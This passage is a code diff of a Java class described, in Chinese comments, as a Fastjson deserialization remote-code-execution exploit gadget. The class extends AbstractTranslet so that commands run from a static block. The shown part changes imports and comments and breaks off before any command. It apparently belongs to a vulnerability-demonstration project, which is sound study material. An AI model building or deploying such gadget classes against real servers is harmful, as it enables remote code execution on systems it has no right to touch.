@@ -1,19 +1,19 @@
+/*
+ * [业务问题]: Fastjson 反序列化 RCE 利用类。
+ * [实现逻辑]: 通过继承 AbstractTranslet 实现 XSLT 模板注入，在静态代码块中执行系统命令。
+ */
 package com.security.bug.fastjson.rce;
 
-import com.sun.org.apache.xalan.internal.xsltc.DOM;
-import com.sun.org.apache.xalan.internal.xsltc.TransletException;
-import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
-import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
-import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
-
-import java.io.IOException;
+import org.apache.xalan.xsltc.DOM;
+import org.apache.xalan.xsltc.TransletException;
+import org.apache.xalan.xsltc.runtime.AbstractTranslet;
+import org.apache.xml.dtm.DTMAxisIterator;
+import org.apache.xml.serializer.SerializationHandler;
 
 /**
- * fastjson反序列化利用class
- *
-
+ * Fastjson 反序列化利用 class
  */
-public class Cmd extends AbstractTranslet{
+public class Cmd extends AbstractTranslet {
 
     static {
         try {
